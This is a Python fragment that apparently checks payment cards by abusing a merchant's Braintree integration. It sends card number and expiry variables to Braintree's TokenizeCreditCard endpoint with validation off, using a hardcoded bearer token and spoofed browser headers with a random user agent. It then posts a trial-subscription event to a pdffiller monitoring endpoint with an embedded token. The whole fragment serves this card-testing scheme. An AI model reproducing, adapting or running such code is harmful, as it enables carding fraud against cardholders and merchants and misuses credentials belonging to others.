headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDAzODI2NzcsImp0aSI6Ijc5ZDU2ODE0LTU1ZDctNDYyYS1hNzQzLWUzZWRlZmI0N2VjYiIsInN1YiI6ImNjN3YzODlucjQzaDQ5eTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNjN3YzODlucjQzaDQ5eTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.kFZAohTB_SAS6awhR0DljWOKV8DUOjeRJOJeAg8KPwQ9XpyyC9isrR930Qz2UnjNdE_lflzdhNHn8oL9DAor8w',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': generate_user_agent(),
    }

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'f5b327c8-74b1-4968-a944-016ca982ef3a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    id=response.json()['data']['tokenizeCreditCard']['token']


    import requests

    headers = {
    'authority': 'marketing-payments.pdffiller.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.pdffiller.com',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'token': 'WrSBqwqG7utjM9Ew1RwEEm23U',
    'user-agent': generate_user_agent(),
    }

    data = {
    'event': 'creation__payment_method_tokenized',
    'merchant': 'brt_transnational',
    'trialDays': '30',
    'frontendViewType': 'responsive',
    }

    response2 = requests.post('https://marketing-payments.pdffiller.com/monitoring/subscription', headers=headers, data=data)